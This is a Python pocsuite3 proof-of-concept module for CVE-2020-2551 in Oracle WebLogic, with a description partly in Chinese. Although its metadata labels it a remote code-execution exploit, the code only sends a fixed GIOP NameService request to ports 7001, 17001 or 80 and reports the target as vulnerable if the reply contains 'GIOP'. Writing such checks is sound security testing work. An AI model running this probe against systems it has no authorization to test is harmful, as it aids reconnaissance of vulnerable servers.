#!/usr/bin/env python3
#coding:utf-8
import socket
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'rootk1t'
    vulDate = '2020-01-15'
    createDate = '2020-07-15'
    updateDate = '2020-07-16'
    references = ['', ]
    name = 'CVE-2020-2551 Weblogic IIOP反序列化漏洞'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'Weblogic'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。
    Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。

    CVE-2020-2551 Unauthenticated Remote Code Execution in IIOP protocol via Malicious JNDI Lookup
    10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0
    '''
    def _verify(self):
        sock = None
        ports = []
        result = {}
        payload = bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')
        
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [7001, 17001, 80]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(7)
                server_addr = (pr.hostname, int(port))
                sock.connect(server_addr)
                sock.send(payload)
                if b'GIOP' in sock.recv(20):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname, port)
                    # result['extra'] = {}
                    # result['extra']['evidence']
                    break
                    
            except Exception as e:
                pass
            finally:
                if sock!=None:
                    sock.close()

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(TestPOC)